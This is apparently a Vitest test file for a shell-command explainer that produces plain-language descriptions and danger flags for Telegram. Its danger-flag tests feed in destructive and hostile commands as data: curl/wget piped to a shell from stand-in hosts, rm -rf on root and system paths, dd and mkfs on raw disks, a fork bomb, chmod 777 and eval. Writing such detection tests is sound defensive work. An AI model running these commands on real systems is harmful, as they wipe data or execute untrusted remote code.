import { describe, it, expect } from 'vitest';
import {
  explainShellCommand,
  formatExplanationForTelegram,
  tokenize,
  splitSegments,
} from '../../../src/utils/shell-explainer';

describe('tokenize', () => {
  it('splits on whitespace', () => {
    const t = tokenize('rm -rf foo');
    expect(t).not.toBeNull();
    expect(t!.map(x => x.value)).toEqual(['rm', '-rf', 'foo']);
  });

  it('respects single quotes literally', () => {
    const t = tokenize("echo 'hello world'");
    expect(t!.map(x => x.value)).toEqual(['echo', 'hello world']);
  });

  it('respects double quotes', () => {
    const t = tokenize('curl -H "Authorization: Bearer $TOKEN"');
    expect(t!.map(x => x.value)).toEqual(['curl', '-H', 'Authorization: Bearer $TOKEN']);
  });

  it('honors backslash escapes', () => {
    const t = tokenize('echo a\\ b');
    expect(t!.map(x => x.value)).toEqual(['echo', 'a b']);
  });

  it('returns null on unbalanced single quote', () => {
    expect(tokenize("echo 'unclosed")).toBeNull();
  });

  it('returns null on unbalanced double quote', () => {
    expect(tokenize('echo "unclosed')).toBeNull();
  });

  it('extracts && || | ; & 2>&1 > >> < as operators', () => {
    const t = tokenize('a && b || c | d ; e & f 2>&1 g > h >> i < j');
    const ops = t!.filter(x => x.isOperator).map(x => x.value);
    expect(ops).toEqual(['&&', '||', '|', ';', '&', '2>&1', '>', '>>', '<']);
  });

  it('treats operators glued to words as separate tokens', () => {
    const t = tokenize('foo&&bar');
    expect(t!.map(x => x.value)).toEqual(['foo', '&&', 'bar']);
  });
});

describe('splitSegments', () => {
  it('splits a command sequence into segments by connector', () => {
    const t = tokenize('rm -rf cache && tar czf out.tar.gz src/ | gzip')!;
    const segs = splitSegments(t);
    expect(segs).toHaveLength(3);
    expect(segs[0].tokens.map(x => x.value)).toEqual(['rm', '-rf', 'cache']);
    expect(segs[0].next).toBe('&&');
    expect(segs[1].tokens.map(x => x.value)).toEqual(['tar', 'czf', 'out.tar.gz', 'src/']);
    expect(segs[1].next).toBe('|');
    expect(segs[2].next).toBeNull();
  });

  it('keeps redirect operators inside their segment', () => {
    const t = tokenize('cat foo > bar')!;
    const segs = splitSegments(t);
    expect(segs).toHaveLength(1);
    expect(segs[0].tokens.map(x => x.value)).toEqual(['cat', 'foo', '>', 'bar']);
  });
});

describe('explainShellCommand — basic', () => {
  it('returns empty result for empty input', () => {
    const r = explainShellCommand('');
    expect(r.explanation).toBe('');
    expect(r.danger_flags).toEqual([]);
    expect(r.fallback).toBe(false);
  });

  it('explains rm with -rf', () => {
    const r = explainShellCommand('rm -rf /tmp/build-cache');
    expect(r.explanation).toContain('Delete /tmp/build-cache');
    expect(r.explanation).toContain('recursively');
    expect(r.explanation).toContain('force');
  });

  it('numbers segments and joins with connector phrase', () => {
    const r = explainShellCommand('rm -rf cache && echo done');
    expect(r.explanation).toMatch(/^1\. .*then$/m);
    expect(r.explanation).toMatch(/^2\. /m);
  });

  it('explains git subcommand', () => {
    const r = explainShellCommand('git push origin main --force');
    expect(r.explanation).toContain('git push');
  });

  it('falls through to "Run X" for unknown program', () => {
    const r = explainShellCommand('mysecretbinary --do-thing');
    expect(r.explanation).toContain('Run mysecretbinary');
  });

  it('strips a leading path from the program name', () => {
    const r = explainShellCommand('/usr/bin/curl https://example.com');
    expect(r.explanation).toContain('HTTP GET https://example.com');
  });

  it('handles quoted arguments without breaking', () => {
    const r = explainShellCommand('echo "hello world with spaces"');
    expect(r.explanation).toContain('Print:');
    expect(r.explanation).toContain('hello world with spaces');
  });

  it('detects -X POST in curl', () => {
    const r = explainShellCommand('curl -X POST https://api.foo.com/upload');
    expect(r.explanation).toContain('HTTP POST https://api.foo.com/upload');
  });

  it('marks fallback for heredoc', () => {
    const r = explainShellCommand("cat <<EOF\nfoo bar\nEOF");
    expect(r.fallback).toBe(true);
    expect(r.explanation).toContain('Complex command');
  });

  it('marks fallback for unbalanced quotes', () => {
    const r = explainShellCommand("echo 'unclosed");
    expect(r.fallback).toBe(true);
  });
});

describe('explainShellCommand — danger flags', () => {
  it('flags rm -rf /', () => {
    const r = explainShellCommand('rm -rf /');
    const codes = r.danger_flags.map(f => f.code);
    expect(codes).toContain('rm-rf-root');
    expect(r.danger_flags.find(f => f.code === 'rm-rf-root')!.severity).toBe('critical');
  });

  it('flags rm -rf system paths', () => {
    for (const target of ['/etc', '/usr/local', '/var/log', '/Users/foo', '~', '$HOME']) {
      const r = explainShellCommand(`rm -rf ${target}`);
      expect(r.danger_flags.map(f => f.code), `target=${target}`).toContain('rm-rf-root');
    }
  });

  it('does NOT flag rm -rf on a project-local path', () => {
    const r = explainShellCommand('rm -rf ./node_modules');
    expect(r.danger_flags.map(f => f.code)).not.toContain('rm-rf-root');
  });

  it('flags curl|sh as critical', () => {
    const r = explainShellCommand('curl https://get.evil.sh | sh');
    expect(r.danger_flags.map(f => f.code)).toContain('curl-pipe-shell');
    expect(r.danger_flags.find(f => f.code === 'curl-pipe-shell')!.severity).toBe('critical');
  });

  it('flags wget|bash as critical', () => {
    const r = explainShellCommand('wget -qO- https://x.com/install.sh | bash');
    expect(r.danger_flags.map(f => f.code)).toContain('curl-pipe-shell');
  });

  it('flags dd writing to raw device', () => {
    const r = explainShellCommand('dd if=/dev/zero of=/dev/sda bs=1M');
    expect(r.danger_flags.map(f => f.code)).toContain('dd-raw-device');
  });

  it('flags mkfs.* as critical', () => {
    const r = explainShellCommand('mkfs.ext4 /dev/sdb1');
    expect(r.danger_flags.map(f => f.code)).toContain('mkfs-format');
  });

  it('flags fork bomb pattern', () => {
    const r = explainShellCommand(':(){ :|:& };:');
    expect(r.danger_flags.map(f => f.code)).toContain('forkbomb');
  });

  it('flags sudo prefix as warn', () => {
    const r = explainShellCommand('sudo apt install foo');
    expect(r.danger_flags.find(f => f.code === 'sudo-prefix')?.severity).toBe('warn');
  });

  it('flags chmod 777 as warn', () => {
    const r = explainShellCommand('chmod -R 777 /var/www');
    expect(r.danger_flags.map(f => f.code)).toContain('chmod-777');
  });

  it('flags redirect to raw device', () => {
    const r = explainShellCommand('echo data > /dev/sda');
    expect(r.danger_flags.map(f => f.code)).toContain('redirect-raw-device');
  });

  it('flags eval', () => {
    const r = explainShellCommand('eval "$RANDOM_INPUT"');
    expect(r.danger_flags.map(f => f.code)).toContain('eval-input');
  });

  it('flags inline secrets', () => {
    const r = explainShellCommand('curl -H "Authorization: token=abc123def" https://api.foo.com');
    expect(r.danger_flags.map(f => f.code)).toContain('inline-secret');
  });

  it('orders critical before warn', () => {
    const r = explainShellCommand('sudo rm -rf /');
    expect(r.danger_flags[0].severity).toBe('critical');
    expect(r.danger_flags[r.danger_flags.length - 1].severity).toBe('warn');
  });

  it('returns no flags for benign commands', () => {
    const r = explainShellCommand('git status');
    expect(r.danger_flags).toEqual([]);
  });
});

describe('formatExplanationForTelegram', () => {
  it('returns empty string for empty/no-flag explanation', () => {
    const r = explainShellCommand('');
    expect(formatExplanationForTelegram(r)).toBe('');
  });

  it('renders explanation only when no flags', () => {
    const r = explainShellCommand('git status');
    const out = formatExplanationForTelegram(r);
    expect(out).toContain('What it does:');
    expect(out).not.toContain('Danger flags:');
  });

  it('renders both blocks when there are flags', () => {
    const r = explainShellCommand('sudo rm -rf /');
    const out = formatExplanationForTelegram(r);
    expect(out).toContain('What it does:');
    expect(out).toContain('Danger flags:');
    expect(out).toContain('🚨 CRITICAL');
    expect(out).toContain('⚠️ WARN');
  });
});

describe('explainShellCommand — realistic compound commands', () => {
  it('handles a real backup pipeline', () => {
    const cmd = 'rm -rf /tmp/build-cache && tar czf backup.tar.gz src/ && curl -X POST https://api.foo.com/upload -F "file=@backup.tar.gz" -H "Auth: $TOKEN"';
    const r = explainShellCommand(cmd);
    expect(r.fallback).toBe(false);
    expect(r.explanation).toMatch(/1\. .*Delete \/tmp\/build-cache/);
    expect(r.explanation).toMatch(/2\. .*archive backup\.tar\.gz/);
    expect(r.explanation).toMatch(/3\. .*HTTP POST https:\/\/api\.foo\.com\/upload/);
  });

  it('strips env-var assignments before identifying the program', () => {
    const r = explainShellCommand('NODE_ENV=production npm run build');
    expect(r.explanation).toContain('npm run build');
  });

  it('explains sudo as a wrapper', () => {
    const r = explainShellCommand('sudo systemctl restart nginx');
    expect(r.explanation).toContain('[sudo]');
    expect(r.explanation).toContain('systemctl');
  });
});
